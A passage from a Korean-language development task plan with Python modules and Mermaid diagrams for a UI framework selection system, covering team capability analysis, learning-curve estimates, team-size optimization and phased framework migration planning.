```

**통합 아키텍처 다이어그램**:

```mermaid
graph TB
    subgraph "Unified Architecture"
        UI[Shared UI Components]
        BL[Business Logic Layer]
        API[API Gateway]

        subgraph "Platform Layers"
            WEB[Web App]
            MOB[Mobile App]
            DESK[Desktop App]
        end

        UI --> WEB
        UI --> MOB
        UI --> DESK

        WEB --> BL
        MOB --> BL
        DESK --> BL

        BL --> API
    end

    subgraph "Development Pipeline"
        CI[CI/CD Pipeline]
        TEST[Cross-Platform Testing]
        BUILD[Platform Builders]

        CI --> TEST
        TEST --> BUILD
        BUILD --> WEB
        BUILD --> MOB
        BUILD --> DESK
    end
```

**검증 기준**:

- [ ] 4가지 이상의 통합 전략 패턴
- [ ] 코드 공유율 계산
- [ ] 플랫폼별 개발 노력 추정
- [ ] 아키텍처 권장사항 생성

## Task 4.15: 팀 역량 매칭

### SubTask 4.15.1: 팀 기술 스택 분석기

**담당자**: 팀 리드  
**예상 소요시간**: 10시간

**작업 내용**:

```python
# backend/src/agents/implementations/ui_selection/team_capability_analyzer.py
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass
from enum import Enum
import numpy as np

@dataclass
class TeamMember:
    """팀 멤버 프로필"""
    id: str
    name: str
    role: str
    skills: Dict[str, float]  # skill_name: proficiency (0-1)
    experience_years: int
    frameworks_used: List[str]
    preferred_stack: List[str]

@dataclass
class TeamCapabilityProfile:
    """팀 역량 프로필"""
    team_size: int
    skill_matrix: Dict[str, float]  # 평균 숙련도
    framework_experience: Dict[str, int]  # 프레임워크별 경험자 수
    learning_capacity: float
    collaboration_score: float
    estimated_ramp_up_time: Dict[str, int]  # 프레임워크별 학습 시간

class TeamCapabilityAnalyzer:
    """팀 역량 분석 및 프레임워크 매칭"""

    SKILL_CATEGORIES = {
        'frontend': ['html', 'css', 'javascript', 'typescript', 'responsive_design'],
        'react_ecosystem': ['react', 'redux', 'react_hooks', 'jsx', 'next.js'],
        'vue_ecosystem': ['vue', 'vuex', 'vue_router', 'nuxt.js'],
        'angular_ecosystem': ['angular', 'rxjs', 'typescript', 'angular_cli'],
        'mobile': ['react_native', 'flutter', 'ios', 'android', 'dart'],
        'backend': ['node.js', 'python', 'java', 'api_design', 'database'],
        'devops': ['docker', 'kubernetes', 'ci_cd', 'aws', 'monitoring']
    }

    async def analyze_team_capabilities(
        self,
        team_members: List[TeamMember]
    ) -> TeamCapabilityProfile:
        """팀 역량 종합 분석"""

        # 기본 통계
        team_size = len(team_members)

        # 스킬 매트릭스 계산
        skill_matrix = self._calculate_skill_matrix(team_members)

        # 프레임워크 경험 집계
        framework_experience = self._aggregate_framework_experience(team_members)

        # 학습 능력 평가
        learning_capacity = self._assess_learning_capacity(team_members)

        # 협업 점수 계산
        collaboration_score = self._calculate_collaboration_score(
            team_members,
            skill_matrix
        )

        # 프레임워크별 예상 학습 시간
        ramp_up_times = self._estimate_ramp_up_times(
            skill_matrix,
            framework_experience,
            learning_capacity
        )

        return TeamCapabilityProfile(
            team_size=team_size,
            skill_matrix=skill_matrix,
            framework_experience=framework_experience,
            learning_capacity=learning_capacity,
            collaboration_score=collaboration_score,
            estimated_ramp_up_time=ramp_up_times
        )

    def _calculate_skill_matrix(
        self,
        team_members: List[TeamMember]
    ) -> Dict[str, float]:
        """팀 전체 스킬 매트릭스 계산"""

        all_skills = {}

        for member in team_members:
            for skill, proficiency in member.skills.items():
                if skill not in all_skills:
                    all_skills[skill] = []
                all_skills[skill].append(proficiency)

        # 평균 숙련도 계산
        skill_matrix = {
            skill: np.mean(proficiencies)
            for skill, proficiencies in all_skills.items()
        }

        return skill_matrix

    async def match_framework_to_team(
        self,
        team_profile: TeamCapabilityProfile,
        framework_candidates: List[str],
        project_timeline: str = 'normal'
    ) -> Dict[str, Any]:
        """팀 역량에 최적화된 프레임워크 매칭"""

        matches = []

        for framework in framework_candidates:
            # 기존 경험 점수
            experience_score = self._calculate_experience_score(
                framework,
                team_profile.framework_experience
            )

            # 관련 스킬 점수
            skill_score = self._calculate_skill_alignment(
                framework,
                team_profile.skill_matrix
            )

            # 학습 곡선 평가
            learning_curve = self._assess_learning_curve(
                framework,
                team_profile,
                project_timeline
            )

            # 종합 점수 계산
            total_score = (
                experience_score * 0.4 +
                skill_score * 0.3 +
                learning_curve * 0.3
            )

            matches.append({
                'framework': framework,
                'total_score': total_score,
                'experience_score': experience_score,
                'skill_score': skill_score,
                'learning_curve_score': learning_curve,
                'estimated_ready_time': team_profile.estimated_ramp_up_time.get(
                    framework, 30
                ),
                'risk_level': self._assess_risk_level(total_score)
            })

        # 점수순 정렬
        matches.sort(key=lambda x: x['total_score'], reverse=True)

        return {
            'best_match': matches[0],
            'alternatives': matches[1:3],
            'recommendations': self._generate_recommendations(
                matches[0],
                team_profile
            )
        }
```

**검증 기준**:

- [ ] 팀원별 스킬 프로필 분석
- [ ] 프레임워크 경험 매핑
- [ ] 학습 능력 평가 알고리즘
- [ ] 팀-프레임워크 적합도 계산

### SubTask 4.15.2: 학습 곡선 평가 시스템

**담당자**: 교육 담당자  
**예상 소요시간**: 10시간

**작업 내용**:

```python
# backend/src/agents/implementations/ui_selection/learning_curve_evaluator.py
from typing import Dict, List, Optional, Tuple
import math
from datetime import datetime, timedelta

@dataclass
class LearningCurveProfile:
    """학습 곡선 프로필"""
    framework: str
    difficulty_level: str  # 'easy', 'moderate', 'steep'
    estimated_time_to_productivity: int  # days
    prerequisite_skills: List[str]
    learning_resources: List[Dict[str, str]]
    common_pitfalls: List[str]
    skill_transferability: Dict[str, float]  # from other frameworks

class LearningCurveEvaluator:
    """프레임워크 학습 곡선 평가 시스템"""

    FRAMEWORK_DIFFICULTY = {
        'react': {
            'base_difficulty': 'moderate',
            'prerequisites': ['javascript', 'es6', 'jsx'],
            'concepts': ['components', 'state', 'props', 'hooks', 'lifecycle'],
            'time_to_basic': 14,  # days
            'time_to_productive': 30,
            'time_to_expert': 180
        },
        'vue': {
            'base_difficulty': 'easy',
            'prerequisites': ['javascript', 'html'],
            'concepts': ['components', 'directives', 'computed', 'watchers'],
            'time_to_basic': 7,
            'time_to_productive': 21,
            'time_to_expert': 120
        },
        'angular': {
            'base_difficulty': 'steep',
            'prerequisites': ['typescript', 'oop', 'decorators', 'rxjs'],
            'concepts': ['dependency_injection', 'modules', 'services', 'observables'],
            'time_to_basic': 21,
            'time_to_productive': 45,
            'time_to_expert': 240
        },
        'flutter': {
            'base_difficulty': 'moderate',
            'prerequisites': ['dart', 'oop', 'widgets'],
            'concepts': ['widgets', 'state_management', 'platform_channels'],
            'time_to_basic': 14,
            'time_to_productive': 35,
            'time_to_expert': 150
        }
    }

    # 프레임워크 간 스킬 전이 매트릭스
    SKILL_TRANSFER_MATRIX = {
        ('react', 'react_native'): 0.8,
        ('react', 'next.js'): 0.9,
        ('vue', 'nuxt.js'): 0.9,
        ('javascript', 'typescript'): 0.7,
        ('react', 'vue'): 0.5,
        ('vue', 'react'): 0.5,
        ('angular', 'react'): 0.3,
        ('java', 'dart'): 0.6,
        ('swift', 'flutter'): 0.4
    }

    async def evaluate_learning_curve(
        self,
        framework: str,
        team_skills: Dict[str, float],
        team_experience: Dict[str, int]
    ) -> LearningCurveProfile:
        """특정 프레임워크의 학습 곡선 평가"""

        framework_config = self.FRAMEWORK_DIFFICULTY.get(framework, {})

        # 기본 난이도
        base_difficulty = framework_config.get('base_difficulty', 'moderate')

        # 필수 스킬 확인
        prerequisites = framework_config.get('prerequisites', [])
        prerequisite_coverage = self._calculate_prerequisite_coverage(
            prerequisites,
            team_skills
        )

        # 스킬 전이 효과 계산
        transfer_bonus = self._calculate_skill_transfer(
            framework,
            team_experience
        )

        # 조정된 학습 시간 계산
        adjusted_times = self._adjust_learning_times(
            framework_config,
            prerequisite_coverage,
            transfer_bonus
        )

        # 학습 리소스 수집
        learning_resources = await self._gather_learning_resources(framework)

        # 일반적인 함정들
        common_pitfalls = self._identify_common_pitfalls(framework)

        return LearningCurveProfile(
            framework=framework,
            difficulty_level=self._adjust_difficulty(
                base_difficulty,
                prerequisite_coverage
            ),
            estimated_time_to_productivity=adjusted_times['productive'],
            prerequisite_skills=prerequisites,
            learning_resources=learning_resources,
            common_pitfalls=common_pitfalls,
            skill_transferability=self._calculate_transferability_map(framework)
        )

    def _calculate_prerequisite_coverage(
        self,
        prerequisites: List[str],
        team_skills: Dict[str, float]
    ) -> float:
        """필수 스킬 보유율 계산"""

        if not prerequisites:
            return 1.0

        coverage_scores = []

        for prereq in prerequisites:
            skill_level = team_skills.get(prereq, 0.0)
            coverage_scores.append(skill_level)

        return sum(coverage_scores) / len(prerequisites)

    def _adjust_learning_times(
        self,
        framework_config: Dict,
        prerequisite_coverage: float,
        transfer_bonus: float
    ) -> Dict[str, int]:
        """학습 시간 조정"""

        base_times = {
            'basic': framework_config.get('time_to_basic', 14),
            'productive': framework_config.get('time_to_productive', 30),
            'expert': framework_config.get('time_to_expert', 180)
        }

        # 필수 스킬 부족시 시간 증가
        prerequisite_penalty = max(0, 1 - prerequisite_coverage) * 1.5

        # 스킬 전이 보너스 적용
        transfer_reduction = transfer_bonus * 0.3

        # 최종 조정
        adjustment_factor = 1 + prerequisite_penalty - transfer_reduction

        adjusted_times = {
            level: int(time * adjustment_factor)
            for level, time in base_times.items()
        }

        return adjusted_times

    async def create_learning_path(
        self,
        framework: str,
        current_skills: Dict[str, float],
        target_proficiency: str = 'productive'
    ) -> Dict[str, Any]:
        """맞춤형 학습 경로 생성"""

        learning_path = {
            'framework': framework,
            'current_readiness': 0.0,
            'target_proficiency': target_proficiency,
            'phases': [],
            'total_duration': 0,
            'resources': []
        }

        # 현재 준비도 평가
        framework_config = self.FRAMEWORK_DIFFICULTY.get(framework, {})
        prerequisites = framework_config.get('prerequisites', [])

        readiness = self._calculate_prerequisite_coverage(
            prerequisites,
            current_skills
        )
        learning_path['current_readiness'] = readiness

        # 학습 단계 구성
        phases = []

        # Phase 1: 필수 스킬 학습
        missing_prerequisites = [
            skill for skill in prerequisites
            if current_skills.get(skill, 0) < 0.5
        ]

        if missing_prerequisites:
            phases.append({
                'phase': 1,
                'title': 'Prerequisites',
                'skills': missing_prerequisites,
                'duration': len(missing_prerequisites) * 3,  # days
                'resources': await self._get_prerequisite_resources(missing_prerequisites)
            })

        # Phase 2: 프레임워크 기초
        phases.append({
            'phase': 2,
            'title': 'Framework Basics',
            'concepts': framework_config.get('concepts', [])[:3],
            'duration': framework_config.get('time_to_basic', 14),
            'resources': await self._get_basic_resources(framework)
        })

        # Phase 3: 실무 역량
        if target_proficiency in ['productive', 'expert']:
            phases.append({
                'phase': 3,
                'title': 'Practical Skills',
                'concepts': framework_config.get('concepts', [])[3:],
                'duration': framework_config.get('time_to_productive', 30) -
                          framework_config.get('time_to_basic', 14),
                'resources': await self._get_practical_resources(framework)
            })

        learning_path['phases'] = phases
        learning_path['total_duration'] = sum(phase['duration'] for phase in phases)

        return learning_path
```

**검증 기준**:

- [ ] 프레임워크별 난이도 평가
- [ ] 스킬 전이 효과 계산
- [ ] 맞춤형 학습 경로 생성
- [ ] 학습 리소스 추천

### SubTask 4.15.3: 팀 규모별 최적화

**담당자**: 프로젝트 매니저  
**예상 소요시간**: 8시간

**작업 내용**:

```python
# backend/src/agents/implementations/ui_selection/team_size_optimizer.py
from typing import Dict, List, Optional, Any
from enum import Enum

class TeamSize(Enum):
    SOLO = (1, 1)
    SMALL = (2, 5)
    MEDIUM = (6, 15)
    LARGE = (16, 50)
    ENTERPRISE = (51, 999)

@dataclass
class TeamSizeOptimization:
    """팀 규모별 최적화 전략"""
    team_size: TeamSize
    recommended_frameworks: List[str]
    architecture_pattern: str
    communication_overhead: float
    tooling_requirements: List[str]
    process_recommendations: List[str]

class TeamSizeOptimizer:
    """팀 규모에 따른 프레임워크 및 프로세스 최적화"""

    TEAM_SIZE_PATTERNS = {
        TeamSize.SOLO: {
            'frameworks': ['vue', 'svelte', 'next.js'],
            'architecture': 'monolithic',
            'tooling': ['minimal', 'integrated'],
            'processes': ['agile', 'kanban'],
            'communication_overhead': 0.0
        },
        TeamSize.SMALL: {
            'frameworks': ['react', 'vue', 'angular'],
            'architecture': 'modular_monolith',
            'tooling': ['standard', 'collaborative'],
            'processes': ['scrum', 'kanban'],
            'communication_overhead': 0.15
        },
        TeamSize.MEDIUM: {
            'frameworks': ['react', 'angular', 'next.js'],
            'architecture': 'microservices_light',
            'tooling': ['comprehensive', 'automated'],
            'processes': ['scaled_agile', 'scrum'],
            'communication_overhead': 0.30
        },
        TeamSize.LARGE: {
            'frameworks': ['angular', 'react', 'enterprise_frameworks'],
            'architecture': 'microservices',
            'tooling': ['enterprise', 'standardized'],
            'processes': ['safe', 'less'],
            'communication_overhead': 0.45
        }
    }

    async def optimize_for_team_size(
        self,
        team_count: int,
        project_requirements: Dict[str, Any]
    ) -> TeamSizeOptimization:
        """팀 규모에 최적화된 권장사항 생성"""

        # 팀 규모 분류
        team_size = self._classify_team_size(team_count)

        # 기본 패턴 가져오기
        pattern = self.TEAM_SIZE_PATTERNS[team_size]

        # 프레임워크 필터링
        recommended_frameworks = await self._filter_frameworks_for_size(
            pattern['frameworks'],
            team_size,
            project_requirements
        )

        # 아키텍처 패턴 결정
        architecture = self._determine_architecture(
            team_size,
            project_requirements
        )

        # 도구 요구사항
        tooling = self._select_tooling(
            team_size,
            project_requirements
        )

        # 프로세스 권장사항
        processes = self._recommend_processes(
            team_size,
            project_requirements.get('timeline', 'normal')
        )

        return TeamSizeOptimization(
            team_size=team_size,
            recommended_frameworks=recommended_frameworks,
            architecture_pattern=architecture,
            communication_overhead=pattern['communication_overhead'],
            tooling_requirements=tooling,
            process_recommendations=processes
        )

    def _select_tooling(
        self,
        team_size: TeamSize,
        requirements: Dict[str, Any]
    ) -> List[str]:
        """팀 규모에 맞는 도구 선택"""

        base_tools = ['git', 'ide', 'package_manager']

        if team_size == TeamSize.SOLO:
            return base_tools + [
                'simple_ci',
                'local_dev_server'
            ]
        elif team_size == TeamSize.SMALL:
            return base_tools + [
                'github_actions',
                'slack',
                'shared_staging',
                'code_review_tool'
            ]
        elif team_size == TeamSize.MEDIUM:
            return base_tools + [
                'jenkins/circleci',
                'jira',
                'confluence',
                'multiple_environments',
                'automated_testing',
                'monitoring'
            ]
        else:  # LARGE, ENTERPRISE
            return base_tools + [
                'enterprise_ci_cd',
                'service_mesh',
                'api_gateway',
                'centralized_logging',
                'apm_tools',
                'security_scanning',
                'dependency_management'
            ]

    async def calculate_framework_fit_score(
        self,
        framework: str,
        team_size: TeamSize,
        team_skills: Dict[str, float]
    ) -> float:
        """팀 규모와 프레임워크 적합도 계산"""

        score = 0.0

        # 팀 규모별 기본 점수
        size_scores = {
            'vue': {TeamSize.SOLO: 0.9, TeamSize.SMALL: 0.8, TeamSize.MEDIUM: 0.6},
            'react': {TeamSize.SMALL: 0.8, TeamSize.MEDIUM: 0.9, TeamSize.LARGE: 0.8},
            'angular': {TeamSize.MEDIUM: 0.8, TeamSize.LARGE: 0.9, TeamSize.ENTERPRISE: 0.9}
        }

        framework_size_scores = size_scores.get(framework, {})
        base_score = framework_size_scores.get(team_size, 0.5)
        score += base_score * 0.4

        # 협업 복잡도 평가
        if team_size.value[1] > 10:  # 큰 팀
            if framework in ['angular', 'react']:
                score += 0.3  # 구조화된 프레임워크 선호
        else:  # 작은 팀
            if framework in ['vue', 'svelte']:
                score += 0.3  # 유연한 프레임워크 선호

        # 스킬 매칭
        skill_match = team_skills.get(framework, 0.0)
        score += skill_match * 0.3

        return min(score, 1.0)
```

**검증 기준**:

- [ ] 5가지 팀 규모 분류
- [ ] 규모별 프레임워크 추천
- [ ] 아키텍처 패턴 매칭
- [ ] 커뮤니케이션 오버헤드 계산

### SubTask 4.15.4: 기술 전환 경로 제안

**담당자**: 기술 전략가  
**예상 소요시간**: 10시간

**작업 내용**:

```python
# backend/src/agents/implementations/ui_selection/tech_migration_advisor.py
from typing import Dict, List, Optional, Tuple, Any
from datetime import datetime, timedelta
import networkx as nx

@dataclass
class MigrationPath:
    """기술 전환 경로"""
    from_stack: str
    to_stack: str
    phases: List[Dict[str, Any]]
    total_duration: int  # weeks
    risk_level: str
    cost_estimate: str
    required_training: List[str]
    parallel_options: List[str]

class TechMigrationAdvisor:
    """기술 스택 전환 경로 제안"""

    # 프레임워크 간 마이그레이션 난이도
    MIGRATION_DIFFICULTY = {
        ('jquery', 'react'): 0.8,
        ('jquery', 'vue'): 0.6,
        ('angular.js', 'angular'): 0.5,
        ('angular.js', 'react'): 0.7,
        ('angular.js', 'vue'): 0.6,
        ('react', 'next.js'): 0.3,
        ('vue', 'nuxt.js'): 0.3,
        ('vanilla_js', 'react'): 0.7,
        ('vanilla_js', 'vue'): 0.5,
        ('backbone', 'react'): 0.8,
        ('ember', 'react'): 0.7
    }

    async def create_migration_path(
        self,
        current_stack: str,
        target_stack: str,
        team_profile: TeamCapabilityProfile,
        constraints: Dict[str, Any]
    ) -> MigrationPath:
        """맞춤형 마이그레이션 경로 생성"""

        # 직접 경로 vs 단계적 경로 평가
        direct_path = self._evaluate_direct_migration(
            current_stack,
            target_stack,
            team_profile
        )

        staged_paths = await self._find_staged_migrations(
            current_stack,
            target_stack,
            team_profile
        )

        # 최적 경로 선택
        optimal_path = self._select_optimal_path(
            direct_path,
            staged_paths,
            constraints
        )

        # 상세 마이그레이션 계획 수립
        migration_phases = await self._create_detailed_phases(
            optimal_path,
            team_profile,
            constraints
        )

        # 위험도 평가
        risk_level = self._assess_migration_risk(
            current_stack,
            target_stack,
            team_profile,
            optimal_path
        )

        # 비용 추정
        cost_estimate = self._estimate_migration_cost(
            migration_phases,
            team_profile.team_size
        )

        # 필요 교육 식별
        required_training = self._identify_training_needs(
            current_stack,
            target_stack,
            team_profile
        )

        # 병렬 실행 옵션
        parallel_options = self._identify_parallel_work(
            migration_phases
        )

        return MigrationPath(
            from_stack=current_stack,
            to_stack=target_stack,
            phases=migration_phases,
            total_duration=sum(phase['duration'] for phase in migration_phases),
            risk_level=risk_level,
            cost_estimate=cost_estimate,
            required_training=required_training,
            parallel_options=parallel_options
        )

    async def _create_detailed_phases(
        self,
        path: List[str],
        team_profile: TeamCapabilityProfile,
        constraints: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """상세 마이그레이션 단계 생성"""

        phases = []

        # Phase 0: 준비 단계
        phases.append({
            'phase': 0,
            'name': 'Preparation',
            'duration': 2,  # weeks
            'tasks': [
                'Set up development environment',
                'Create migration team',
                'Establish success metrics',
                'Create rollback plan'
            ],
            'deliverables': [
                'Migration plan document',
                'Team assignments',
                'Success criteria'
            ],
            'risks': ['Team availability', 'Scope creep']
        })

        # Phase 1: 파일럿 프로젝트
        phases.append({
            'phase': 1,
            'name': 'Pilot Project',
            'duration': 4,
            'tasks': [
                'Select pilot component/feature',
                'Implement in new framework',
                'Compare performance',
                'Gather team feedback'
            ],
            'deliverables': [
                'Pilot implementation',
                'Performance report',
                'Lessons learned'
            ],
            'risks': ['Unexpected complexity', 'Performance issues']
        })

        # Phase 2: 코어 마이그레이션
        if len(path) > 2:  # 단계적 마이그레이션
            for i in range(len(path) - 1):
                from_tech = path[i]
                to_tech = path[i + 1]

                phases.append({
                    'phase': 2 + i,
                    'name': f'Migrate {from_tech} to {to_tech}',
                    'duration': self._estimate_phase_duration(
                        from_tech,
                        to_tech,
                        team_profile
                    ),
                    'tasks': [
                        f'Convert {from_tech} components',
                        'Update build pipeline',
                        'Migrate state management',
                        'Update tests'
                    ],
                    'deliverables': [
                        'Migrated components',
                        'Updated documentation',
                        'Test coverage report'
                    ],
                    'risks': self._identify_phase_risks(from_tech, to_tech)
                })
        else:  # 직접 마이그레이션
            phases.append({
                'phase': 2,
                'name': 'Core Migration',
                'duration': self._estimate_phase_duration(
                    path[0],
                    path[1],
                    team_profile
                ),
                'tasks': [
                    'Component migration',
                    'State management migration',
                    'Routing migration',
                    'API integration updates'
                ],
                'deliverables': [
                    'Migrated application',
                    'Updated documentation',
                    'Performance benchmarks'
                ],
                'risks': ['Data loss', 'Integration issues']
            })

        # Phase Final: 최적화 및 정리
        phases.append({
            'phase': len(phases),
            'name': 'Optimization & Cleanup',
            'duration': 2,
            'tasks': [
                'Performance optimization',
                'Remove legacy code',
                'Update CI/CD pipeline',
                'Team training completion'
            ],
            'deliverables': [
                'Optimized application',
                'Final documentation',
                'Training materials'
            ],
            'risks': ['Technical debt', 'Knowledge transfer']
        })

        return phases

    def _create_migration_graph(self) -> nx.DiGraph:
        """마이그레이션 경로 그래프 생성"""

        G = nx.DiGraph()

        # 노드 추가 (프레임워크들)
        frameworks = [
            'jquery', 'vanilla_js', 'backbone', 'angular.js',
            'ember', 'react', 'vue', 'angular', 'svelte',
            'next.js', 'nuxt.js', 'gatsby'
        ]

        G.add_nodes_from(frameworks)

        # 엣지 추가 (마이그레이션 경로)
        for (from_fw, to_fw), difficulty in self.MIGRATION_DIFFICULTY.items():
            G.add_edge(from_fw, to_fw, weight=difficulty)

        return G

    async def _find_staged_migrations(
        self,
        current: str,
        target: str,
        team_profile: TeamCapabilityProfile
    ) -> List[List[str]]:
        """단계적 마이그레이션 경로 찾기"""

        G = self._create_migration_graph()

        try:
            # 모든 가능한 경로 찾기
            all_paths = list(nx.all_simple_paths(G, current, target, cutoff=3))

            # 경로별 비용 계산
            path_costs = []
            for path in all_paths:
                cost = 0
                for i in range(len(path) - 1):
                    if G.has_edge(path[i], path[i + 1]):
                        cost += G[path[i]][path[i + 1]]['weight']
                    else:
                        cost += 1.0  # 기본 난이도

                path_costs.append((path, cost))

            # 비용순 정렬
            path_costs.sort(key=lambda x: x[1])

            return [path for path, _ in path_costs[:3]]  # 상위 3개 경로

        except nx.NetworkXNoPath:
            # 직접 경로만 반환
            return [[current, target]]
```

**마이그레이션 전략 다이어그램**:

```mermaid
graph LR
    subgraph "Legacy Stack"
        JQ[jQuery]
        BB[Backbone]
        AJS[Angular.js]
    end

    subgraph "Modern Stack"
        REACT[React]
        VUE[Vue]
        ANG[Angular]
    end

    subgraph "Next Gen"
        NEXT[Next.js]
        NUXT[Nuxt.js]
        SVELTE[Svelte]
    end

    JQ -->|Direct| REACT
    JQ -->|Easier| VUE
    AJS -->|Natural| ANG
    AJS -->|Popular| REACT

    REACT -->|Enhancement| NEXT
    VUE -->|Enhancement| NUXT

    BB -->|Complex| REACT
    BB -->|Moderate| VUE
```

**검증 기준**:

- [ ] 마이그레이션 경로 그래프
- [ ] 단계별 전환 계획
- [ ] 위험도 평가 알고리즘
- [ ] 비용 및 기간 추정

## Task 4.16: 프레임워크 마이그레이션

### SubTask 4.16.1: 마이그레이션 타당성 분석

**담당자**: 기술 분석가  
**예상 소요시간**: 10시간

**작업 내용**:

```python
# backend/src/agents/implementations/ui_selection/migration_feasibility_analyzer.py
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass
from enum import Enum
import pandas as pd

@dataclass
class FeasibilityReport:
    """마이그레이션 타당성 보고서"""
    is_feasible: bool
    feasibility_score: float  # 0-1
    technical_complexity: str  # low, medium, high
    business_impact: str
    estimated_roi: float
    break_even_point: int  # months
    key_risks: List[Dict[str, Any]]
    recommendations: List[str]
    alternative_approaches: List[Dict[str, Any]]

class MigrationFeasibilityAnalyzer:
    """프레임워크 마이그레이션 타당성 분석"""

    async def analyze_migration_feasibility(
        self,
        current_state: Dict[str, Any],
        target_framework: str,
        business_context: Dict[str, Any]
    ) -> FeasibilityReport:
        """마이그레이션 타당성 종합 분석"""

        # 1. 기술적 복잡도 평가
        technical_complexity = await self._assess_technical_complexity(
            current_state,
            target_framework
        )

        # 2. 비즈니스 영향 분석
        business_impact = await self._analyze_business_impact(
            current_state,
            business_context
        )

        # 3. 비용 대비 효과 분석
        cost_benefit = await self._perform_cost_benefit_analysis(
            current_state,
            target_framework,
            business_context
        )

        # 4. 위험 요소 식별
        risks = await self._identify_risks(
            current_state,
            target_framework,
            technical_complexity
        )

        # 5. 대안 평가
        alternatives = await self._evaluate_alternatives(
            current_state,
            target_framework,
            business_context
        )

        # 6. 최종 타당성 점수 계산
        feasibility_score = self._calculate_feasibility_score(
            technical_complexity,
            business_impact,
            cost_benefit,
            risks
        )

        # 7. 권장사항 생성
        recommendations = self._generate_recommendations(
            feasibility_score,
            technical_complexity,
            business_impact,
            risks
        )

        return FeasibilityReport(
            is_feasible=feasibility_score > 0.6,
            feasibility_score=feasibility_score,
            technical_complexity=technical_complexity['level'],
            business_impact=business_impact['level'],
            estimated_roi=cost_benefit['roi'],
            break_even_point=cost_benefit['break_even_months'],
            key_risks=risks,
            recommendations=recommendations,
            alternative_approaches=alternatives
        )

    async def _assess_technical_complexity(
        self,
        current_state: Dict[str, Any],
        target_framework: str
    ) -> Dict[str, Any]:
        """기술적 복잡도 평가"""

        complexity_factors = {
            'codebase_size': 0,
            'architectural_changes': 0,
            'dependency_conflicts': 0,
            'feature_parity': 0,
            'testing_effort': 0
        }

        # 코드베이스 크기 평가
        loc = current_state.get('lines_of_code', 0)
        if loc > 100000:
            complexity_factors['codebase_size'] = 0.9
        elif loc > 50000:
            complexity_factors['codebase_size'] = 0.7
        elif loc > 10000:
            complexity_factors['codebase_size'] = 0.5
        else:
            complexity_factors['codebase_size'] = 0.3

        # 아키텍처 변경 필요성
        current_architecture = current_state.get('architecture', 'mvc')
        target_architecture = self._get_typical_architecture(target_framework)

        if current_architecture != target_architecture:
            complexity_factors['architectural_changes'] = 0.8
        else:
            complexity_factors['architectural_changes'] = 0.3

        # 의존성 충돌 가능성
        current_deps = set(current_state.get('dependencies', []))
        target_deps = self._get_framework_dependencies(target_framework)

        conflicts = self._check_dependency_conflicts(current_deps, target_deps)
        complexity_factors['dependency_conflicts'] = len(conflicts) / 10.0

        # 기능 일치도
        feature_gap = await self._analyze_feature_gap(
            current_state.get('features', []),
            target_framework
        )
        complexity_factors['feature_parity'] = feature_gap

        # 테스트 노력
        test_coverage = current_state.get('test_coverage', 0)
        if test_coverage < 30:
            complexity_factors['testing_effort'] = 0.9
        elif test_coverage < 60:
            complexity_factors['testing_effort'] = 0.6
        else:
            complexity_factors['testing_effort'] = 0.3

        # 종합 복잡도 계산
        avg_complexity = sum(complexity_factors.values()) / len(complexity_factors)

        level = 'low' if avg_complexity < 0.4 else 'medium' if avg_complexity < 0.7 else 'high'

        return {
            'level': level,
            'score': avg_complexity,
            'factors': complexity_factors,
            'critical_areas': [
                factor for factor, score in complexity_factors.items()
                if score > 0.7
            ]
        }
```

**검증 기준**:

- [ ] 기술적 복잡도 측정
- [ ] 비즈니스 영향 평가
- [ ] ROI 계산 로직
- [ ] 리스크 식별 알고리즘

### SubTask 4.16.2: 단계별 마이그레이션 계획

**담당자**: 마이그레이션 전문가  
**예상 소요시간**: 12시간

**작업 내용**:

```python
# backend/src/agents/implementations/ui_selection/phased_migration_planner.py
from typing import Dict, List, Optional, Any
from datetime import datetime, timedelta
import json

@dataclass
class MigrationPhase:
    """마이그레이션 단계"""
    phase_number: int
    name: str
    start_date: datetime
    end_date: datetime
    objectives: List[str]
    tasks: List[Dict[str, Any]]
    dependencies: List[int]  # 선행 단계 번호
    success_criteria: List[str]
    rollback_plan: Dict[str, Any]
    resources_required: Dict[str, int]

class PhasedMigrationPlanner:
    """단계별 마이그레이션 계획 수립"""

    async def create_phased_migration_plan(
        self,
        project_analysis: Dict[str, Any],
        target_framework: str,
        constraints: Dict[str, Any]
    ) -> List[MigrationPhase]:
        """단계별 마이그레이션 계획 생성"""

        phases = []
        start_date = constraints.get('start_date', datetime.now())

        # Phase 1: 준비 및 분석
        phase1 = await self._create_preparation_phase(
            project_analysis,
            target_framework,
            start_date
        )
        phases.append(phase1)

        # Phase 2: 인프라 및 도구 설정
        phase2 = await self._create_infrastructure_phase(
            target_framework,
            phase1.end_date + timedelta(days=1)
        )
        phases.append(phase2)

        # Phase 3: 파일럿 마이그레이션
        phase3 = await self._create_pilot_phase(
            project_analysis,
            target_framework,
            phase2.end_date + timedelta(days=1)
        )
        phases.append(phase3)

        # Phase 4-N: 모듈별 마이그레이션
        module_phases = await self._create_module_migration_phases(
            project_analysis,
            target_framework,
            phase3.end_date + timedelta(days=1)
        )
        phases.extend(module_phases)

        # Final Phase: 통합 및 최적화
        final_phase = await self._create_finalization_phase(
            len(phases) + 1,
            module_phases[-1].end_date + timedelta(days=1)
        )
        phases.append(final_phase)

        # 의존성 검증
        self._validate_dependencies(phases)

        return phases

    async def _create_preparation_phase(
        self,
        project_analysis: Dict[str, Any],
        target_framework: str,
        start_date: datetime
    ) -> MigrationPhase:
        """준비 단계 생성"""

        duration_days = self._estimate_phase_duration('preparation', project_analysis)

        return MigrationPhase(
            phase_number=1,
            name="Preparation and Analysis",
            start_date=start_date,
            end_date=start_date + timedelta(days=duration_days),
            objectives=[
                "Complete current system analysis",
                "Identify migration candidates",
                "Set up migration team",
                "Establish success metrics"
            ],
            tasks=[
                {
                    'id': 'task_1_1',
                    'name': 'Code inventory and analysis',
                    'duration': 5,
                    'assigned_to': ['tech_lead', 'senior_dev'],
                    'outputs': ['dependency_map', 'complexity_report']
                },
                {
                    'id': 'task_1_2',
                    'name': 'Feature mapping to target framework',
                    'duration': 3,
                    'assigned_to': ['architect'],
                    'outputs': ['feature_compatibility_matrix']
                },
                {
                    'id': 'task_1_3',
                    'name': 'Risk assessment',
                    'duration': 2,
                    'assigned_to': ['tech_lead', 'pm'],
                    'outputs': ['risk_register', 'mitigation_plan']
                },
                {
                    'id': 'task_1_4',
                    'name': 'Team training plan',
                    'duration': 2,
                    'assigned_to': ['tech_lead'],
                    'outputs': ['training_schedule', 'skill_gap_analysis']
                }
            ],
            dependencies=[],
            success_criteria=[
                "100% code inventory completed",
                "All high-risk areas identified",
